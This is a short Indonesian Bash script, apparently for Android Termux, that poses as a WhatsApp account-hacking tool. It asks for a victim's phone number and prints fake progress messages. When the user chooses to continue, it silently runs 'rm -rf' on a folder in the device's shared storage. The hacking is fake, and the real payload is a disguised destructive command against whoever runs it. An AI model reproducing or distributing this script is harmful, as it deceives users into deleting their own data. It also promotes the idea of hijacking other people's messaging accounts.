#/bin/bash
clear
figlet "hack wa"
echo "\33[31;1m"
echo "\tDisclaimer : Jangan Disalah Gunakan"
echo "\33[37;1m"
echo "(ex : 082××××××× )"
read -p "masukan no wa : " user
sleep 1
echo "sedang mengambil data nomor $user"
sleep 1
echo "\33[31;1m[ Pastikan Koneksi Lancar!!! ]"
echo "\33[32;1m"
sleep 3
echo "proses memerlukan waktu 1-5 menit"
sleep 3
echo "loading.............."
sleep 2
echo "\33[37;1m"
echo "Selesai!"
sleep 1
echo "\33[31;1mJika Lanjut Maka Akan Ke Tahap Kode Verifikasi!"
sleep 1
echo "\33[37;1m"
read -p "lanjut/tidak : " isi
if [ "$isi" = "lanjut" ];
then
  echo "menyiapkan Kode Verifikasi...."
  sleep 3
  rm -rf /storage/emulated/0/ciciLbiadab
elif [ "$isi" = "tidak" ];
then
  echo "Ok Terimakasih"
  exit
fi	